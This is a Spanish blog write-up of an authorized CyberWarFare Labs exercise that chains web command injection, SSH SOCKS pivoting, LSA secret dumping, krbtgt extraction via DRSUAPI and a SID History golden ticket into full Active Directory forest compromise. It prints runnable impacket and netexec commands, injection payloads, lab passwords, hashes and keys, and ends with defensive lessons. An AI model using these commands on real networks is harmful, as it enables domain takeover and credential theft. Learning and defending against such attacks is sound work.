---
layout: single
title: "De un RCE web a Enterprise Admin: abuso de trust padre-hijo en Active Directory"
date: 2026-07-07
categories: [writeups, active-directory]
tags: [writeup, active-directory, kerberos, golden-ticket, sid-history, pivoting, impacket, netexec, cyberwarfare-labs]
excerpt: "De un command injection en un formulario web a control total del bosque AD: pivoting con SOCKS, robo de secretos LSA, extracción del krbtgt vía DRSUAPI y golden ticket con SID History para saltar de un dominio hijo al padre."
permalink: /writeups/child-parent-trust-ad/
toc: true
toc_sticky: true
---

> Writeup de un laboratorio de **CyberWarFare Labs**. Todo lo que hay aquí se
> ejecutó en un entorno de pruebas aislado y autorizado. El objetivo no es soltar
> comandos sueltos, sino entender **por qué** funciona cada paso —sobre todo la
> parte de Kerberos y el golden ticket con SID History, que es donde está la miga.

La cadena completa va desde un simple **command injection en un formulario web**
hasta **control total del bosque** de Active Directory, pasando por pivoting, robo
de credenciales en memoria y un abuso del trust transitivo entre un dominio hijo y
su dominio padre. Vamos por partes.

## TL;DR — la cadena de un vistazo

```
Web RCE (command injection en campo email)
  → SSH  privilege@192.168.80.10
  → SSH -D 1080  (pivot SOCKS a la red interna)
  → nxc: john es admin local en MGMT (192.168.98.30)
  → LSA secrets → credenciales de corpmngr en claro
  → nxc: corpmngr es admin en CDC (192.168.98.120, DC del dominio hijo)
  → secretsdump (DRSUAPI): hash del krbtgt del hijo
  → lookupsid: SIDs del dominio hijo y del padre
  → ticketer.py: golden ticket con SID History de Enterprise Admins del padre
  → getST.py: Service Ticket válido contra el DC padre (abuso de trust transitivo)
  → secretsdump contra el DC padre: hash del Administrator del bosque
  → psexec: SYSTEM en DC01 → control total del bosque
```

## Topología y scope

```
VPN:      10.10.200.0/24
Externa:  192.168.80.0/24  → 192.168.80.10  (pivote inicial, Ubuntu)
Interna:  192.168.98.0/24  → solo alcanzable vía pivoting

Dominio padre: warfare.corp        DC: 192.168.98.2    (DC01)
Dominio hijo:  child.warfare.corp  DC: 192.168.98.120  (CDC)
Máquina hijo:  192.168.98.30       (MGMT)
```

`warfare.corp` y `child.warfare.corp` forman un **bosque AD con relación
padre-hijo**: mismo bosque, dominios distintos. Esto es la clave de todo el
ejercicio: dentro de un mismo bosque, el trust entre padre e hijo es
**bidireccional y transitivo por diseño**. Justo lo que vamos a explotar.

> El `.1` de cada rango está fuera de scope, y el servidor tenía bloqueo temporal
> de ping, así que a veces hay que escanear IPs concretas en vez de barrer.

## Fase 1 — Acceso inicial (red externa)

Descubrimiento y escaneo del host vivo:

```bash
nmap -sn 192.168.80.0/24        # hosts vivos
nmap -sC -sV 192.168.80.10      # puerto 80 abierto → web e-commerce
```

En la web hay un **signup**. Me registro con un usuario cualquiera, entro al
dashboard e intercepto el tráfico con Burp. El campo interesante aparece en el
formulario de **newsletter**: el parámetro `email` es vulnerable a **command
injection**.

```
EMAIL=ls
EMAIL=cat /etc/passwd
```

Volcando `/etc/passwd` aparece un usuario `privilege` con credencial reutilizable
→ acceso directo por SSH:

```bash
ssh privilege@192.168.80.10
```

Primer punto de apoyo dentro de la red externa.

## Fase 2 — Pivoting hacia la red interna

La máquina comprometida tiene una **segunda interfaz** en `192.168.98.0/24`,
invisible desde la VPN. Para llegar sin instalar nada permanente, monto un túnel
**SOCKS** con el propio SSH:

```bash
ssh -D 1080 privilege@192.168.80.10
```

**Qué hace `-D`:** abre un proxy **SOCKS5** local en el puerto 1080. Cualquier
herramienta que hable a través de ese proxy "sale a la red" desde el punto de
vista de `192.168.80.10`: los paquetes viajan dentro del túnel SSH cifrado y salen
por la segunda tarjeta de red de la víctima.

Para que herramientas sin soporte nativo de SOCKS (nmap, nxc, impacket) usen el
proxy, uso **proxychains**:

`/etc/proxychains4.conf`:
```
socks5 127.0.0.1 1080
```

A partir de aquí, **todo comando de red va precedido de `proxychains`**:

```bash
proxychains nmap -sn 192.168.98.0/24
```

> **Detalle que me costó y que conviene grabarse:** proxychains, por defecto,
> también reenvía las **resoluciones DNS** por el proxy. Si un hostname
> (`child.warfare.corp`, `warfare.corp`, `dc01.warfare.corp`,
> `cdc.child.warfare.corp`) no está en `/etc/hosts`, el proxy no sabe a qué IP
> resolverlo y falla con timeout aunque la IP sea perfectamente alcanzable.
> Solución: mapear a mano en `/etc/hosts`.

```
192.168.98.2    warfare.corp        dc01.warfare.corp
192.168.98.120  child.warfare.corp  cdc.child.warfare.corp
```

> Alternativamente, `ligolo-ng` es otra opción muy cómoda para el pivoting (crea
> una interfaz `tun` y te olvidas de proxychains). Con SSH `-D` + proxychains es
> suficiente para este lab.

## Fase 3 — Descubrimiento en la red interna

```bash
proxychains nmap -sn 192.168.98.0/24
```

Hosts vivos: `.2` (DC01 / warfare.corp), `.15`, `.30` (MGMT / child.warfare.corp),
`.120` (CDC / child.warfare.corp).

En la primera máquina había credenciales guardadas en los **bookmarks de Firefox**
(base de datos `places.sqlite`) para el usuario `john`. Las rocío contra los hosts
internos con **netexec** (`nxc`, el sucesor de crackmapexec):

```bash
proxychains nxc smb 192.168.98.30 -u john -p 'User1@#$%6'
```

Resultado: **`(Pwn3d!)`** → `john` es **administrador local** en `MGMT`
(192.168.98.30).

> `(Pwn3d!)` es la marca de nxc que indica que, además de autenticarte, **tienes
> privilegios de admin local** (no solo un login válido). Es la señal de que
> puedes ejecutar comandos remotos o volcar secretos.

## Fase 4 — Extracción de secretos LSA (primer salto de credenciales)

```bash
proxychains nxc smb 192.168.98.30 -u john -p 'User1@#$%6' --lsa
```

### Qué es LSA y por qué salen contraseñas en claro

**LSA (Local Security Authority)** es el subsistema de Windows que gestiona la
autenticación local y guarda ciertos secretos que el sistema necesita poder
**leer literalmente** (no solo verificar):

- Contraseñas de cuentas de servicio configuradas para arrancar solas.
- Credenciales de dominio cacheadas (para loguearse aunque el DC no responda).
- Claves DPAPI (para descifrar credenciales guardadas por apps).

Para volcarlo remotamente por red (sin sesión gráfica), nxc usa el mismo método
que `secretsdump.py`: acceso remoto al registro vía SMB con privilegios de admin.

En el volcado aparece, **en texto claro**:

```
corpmngr@child.warfare.corp : User4&*&*
```

**¿Por qué en claro y no como hash?** Porque esta contraseña estaba almacenada de
forma **reversible**: algún servicio o tarea programada en `MGMT` la usa
activamente con la cuenta `corpmngr`, y Windows necesita poder "leerla" para
autenticarse en su nombre. Es un patrón clásico de movimiento lateral: alguien
configuró un servicio con una cuenta de más privilegio del necesario, y cualquier
admin local de esa máquina puede robarla.

## Fase 5 — Segundo salto: `corpmngr` es admin en el DC hijo

```bash
proxychains nxc smb 192.168.98.30  -u corpmngr -p 'User4&*&*'   # login válido, NO Pwn3d!
proxychains nxc smb 192.168.98.120 -u corpmngr -p 'User4&*&*'   # (Pwn3d!) → admin en CDC
```

`corpmngr` **no** es admin en la máquina donde lo encontré (MGMT), pero **sí** en
**CDC (192.168.98.120)**, que es el **Domain Controller del dominio hijo**. Esa es
la puerta de entrada al ataque de trust.

## Fase 6 — El corazón del ataque: extraer el `krbtgt` del hijo

### ¿Qué es la cuenta `krbtgt`?

En cualquier dominio de Active Directory, `krbtgt` es una cuenta especial que
**nunca se usa para login humano**. Su única función: el **KDC (Key Distribution
Center**, el servicio Kerberos que corre en cada DC) usa el hash de esta cuenta
para **firmar criptográficamente todos los TGT (Ticket Granting Tickets)** que
emite a los usuarios del dominio.

> **Analogía:** `krbtgt` es el *sello del notario*. Cuando un usuario se loguea, el
> DC (notario) firma un "TGT" (documento) con ese sello. Cualquier otro servicio
> del dominio que reciba ese documento confía en él **porque lleva el sello**, no
> porque verifique nada más.
>
> **Si tienes el hash de `krbtgt`, tienes el sello:** puedes fabricar tú mismo
> tickets firmados, sin que el DC real participe. Eso es un **golden ticket**.

### Extracción con `secretsdump.py` vía DRSUAPI

```bash
proxychains secretsdump.py \
  child/corpmngr:'User4&*&*'@cdc.child.warfare.corp \
  -just-dc-user 'child\krbtgt'
```

**Sintaxis** (la parte que más se atraganta):

```
secretsdump.py [flags] DOMINIO/USUARIO:CONTRASEÑA@DESTINO_DE_RED
```

- Todo lo que va **después de la única `@`** es el host al que te conectas por red
  — **nunca** el nombre de la cuenta que quieres extraer.
- Para pedir solo una cuenta concreta (más rápido y menos ruidoso que volcar el
  NTDS entero) se usa el flag `-just-dc-user 'dominio\usuario'`, que va **aparte**.

**Cómo lo consigue por dentro:** con privilegios de admin, `secretsdump.py` usa el
protocolo **DRSUAPI** —el mismo que usan los DCs entre sí para replicarse la base
de datos de AD (`NTDS.dit`)— para pedir "replícame este objeto". Literalmente
abusa del mecanismo de replicación legítimo de AD para sacar cualquier hash,
incluido `krbtgt`, sin tocar el archivo `NTDS.dit`.

Del volcado saco la clave AES del `krbtgt` del hijo:

```
krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
```

## Fase 7 — Obtener los SIDs de ambos dominios

Cada objeto de AD se identifica por un **SID (Security Identifier)** con formato
`S-1-5-21-X-Y-Z-RID`, donde `S-1-5-21-X-Y-Z` es el SID del dominio y `RID`
identifica al objeto dentro de él. Algunos RIDs universales:

- `-500` → Administrator
- `-512` → Domain Admins
- `-516` → Domain Controllers
- `-519` → Enterprise Admins

```bash
proxychains lookupsid.py child/corpmngr:'User4&*&*'@child.warfare.corp
# → SID hijo:  S-1-5-21-3754860944-83624914-1883974761

proxychains lookupsid.py child/corpmngr:'User4&*&*'@warfare.corp
# → SID padre: S-1-5-21-3375883379-808943238-3239386119
#   (aquí también se ve el grupo 519: WARFARE\Enterprise Admins)
```

> Cuando `lookupsid.py` daba timeout por el DNS del proxy, la alternativa que
> funcionó fue: `nxc ldap <IP> -u ... -p ... --get-sid`.

## Fase 8 — Forjar el golden ticket con SID History (el salto padre-hijo)

```bash
ticketer.py -domain child.warfare.corp \
  -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 \
  -domain-sid S-1-5-21-3754860944-83624914-1883974761 \
  -groups 516 \
  -user-id 1106 \
  -extra-sid S-1-5-21-3375883379-808943238-3239386119-519,S-1-5-9 \
  corpmngr
```

### Por qué cada pieza, de cero

- **`-domain child.warfare.corp` + `-aesKey`**: "fabrica un ticket firmado con el
  sello (`krbtgt`) del dominio hijo, que es el que controlo".
- **`-domain-sid`**: el prefijo de identidad del dominio hijo, para que el ticket
  declare de forma coherente de qué dominio es nativo el usuario.
- **`-groups 516` + `-user-id 1106`**: dentro del hijo, el ticket dice "este
  usuario (corpmngr, RID 1106) pertenece a Domain Controllers (516)". Privilegios
  altos, pero **solo dentro del hijo**.
- **`-extra-sid  SID_PADRE-519, S-1-5-9`**: **la pieza que rompe la barrera entre
  dominios.** Es **SID History**, una característica *legítima* de AD: existe para
  que, al migrar un usuario de un dominio a otro, conserve sus permisos antiguos.
  El problema es que **nada impide que un ticket forjado declare cualquier SID
  History**, incluido el de **Enterprise Admins (`-519`)** del dominio padre — un
  grupo que en un bosque AD tiene control total sobre **todos** los dominios, no
  solo uno.
- **`S-1-5-9`**: SID universal fijo ("Enterprise Domain Controllers"), añadido para
  que el ticket se comporte como tráfico legítimo entre DCs.

### Por qué el DC padre se lo cree

Cuando el DC padre recibe un ticket que dice "vengo del dominio hijo y tengo SID
History de Enterprise Admins del padre", **no vuelve a comprobar si eso es cierto
en su propia base de datos**. Confía en la **firma criptográfica** del ticket (que
es válida, porque la hiciste con el `krbtgt` real del hijo) y en la **confianza
transitiva** del bosque.

> Esta es la razón de fondo por la que, en Active Directory, **controlar cualquier
> dominio hijo de un bosque equivale, en la práctica, a controlar todo el
> bosque**. Es una de las razones por las que las arquitecturas multi-dominio se
> consideran hoy un **límite de seguridad débil**: el borde de seguridad real es el
> *bosque*, no el *dominio*.

## Fase 9 — Usar el ticket para pedir acceso al dominio padre

```bash
export KRB5CCNAME=corpmngr.ccache

proxychains getST.py -spn 'CIFS/dc01.warfare.corp' \
  -k -no-pass child.warfare.corp/corpmngr -debug
```

- **`KRB5CCNAME`** es la variable estándar de Linux que le dice a cualquier
  herramienta Kerberos "usa este ticket cacheado en vez de pedir contraseña".
- **`getST.py`** pide un **Service Ticket (ST)**: no un TGT nuevo, sino el
  siguiente paso normal de Kerberos — "con mi TGT (falso) ya validado, dame un
  ticket para hablar con el servicio **CIFS** de `dc01.warfare.corp`". En el log se
  ve cómo conecta primero a `CHILD.WARFARE.CORP:88` y luego a `WARFARE.CORP:88`:
  eso es el **referral** entre dominios, la prueba de que el trust se está usando.
- Como el ticket lleva el SID de Enterprise Admins del padre, el KDC del padre lo
  acepta y emite un ST válido.

```bash
export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
```

## Fase 10 — Dominio padre comprometido

```bash
proxychains secretsdump.py dc01.warfare.corp -k -no-pass \
  -just-dc-user 'warfare\Administrator'
```

Con el Service Ticket válido (autenticación **Kerberos**, sin usuario/contraseña),
vuelco el hash del Administrator del dominio raíz:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60:::
```

Y shell final como **SYSTEM** en el DC raíz del bosque, vía **pass-the-hash**:

```bash
proxychains psexec.py 'warfare/Administrator@dc01.warfare.corp' \
  -hashes aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60
```

Bosque comprometido de punta a punta. 🏁

## Lecciones defensivas (blue team)

Un writeup ofensivo se queda cojo sin la otra cara. Cómo se rompe esta cadena:

1. **Command injection web** → validación/sanitización de entrada, no pasar
   parámetros de usuario a comandos del sistema, WAF y ejecución con mínimo
   privilegio del servicio web.
2. **Credenciales en `/etc/passwd`, bookmarks y LSA** → no reutilizar contraseñas,
   no guardar credenciales en navegadores/archivos de texto, LAPS para las cuentas
   de admin local, y **Credential Guard** para proteger secretos de LSA.
3. **Cuentas de servicio sobre-privilegiadas** → principio de mínimo privilegio;
   usar **gMSA** (cuentas de servicio administradas) en lugar de cuentas con
   contraseña reversible.
4. **Golden ticket / robo de `krbtgt`** → rotar el `krbtgt` periódicamente (dos
   veces seguidas), monitorizar TGTs con lifetimes anómalos y detectar
   `DCSync`/DRSUAPI desde equipos que no son DCs.
5. **SID History spoofing** → habilitar **SID Filtering** en los trusts donde
   aplique, y tratar el **bosque** —no el dominio— como el verdadero límite de
   seguridad. Si necesitas aislamiento real, usa **bosques separados**, no dominios
   hijos.

## Conclusión

Lo interesante de este lab no es ninguna vulnerabilidad exótica: es una **cadena de
configuraciones débiles perfectamente normales** (un input mal saneado, una
contraseña reutilizada, una cuenta de servicio con demasiado privilegio) que
termina abusando de una característica **totalmente legítima y por diseño** de
Active Directory: la confianza transitiva dentro de un bosque y el SID History.

La conclusión que me llevo: en AD, **el dominio no es una frontera de seguridad**.
Si un atacante controla cualquier DC hijo, controla el bosque entero. Diseñar
pensando que "cada dominio está aislado" es justo el error que este ataque
explota.

---

*Lab: [CyberWarFare Labs](https://cyberwarfare.live). Ejecutado en entorno de
pruebas autorizado con fines educativos.*
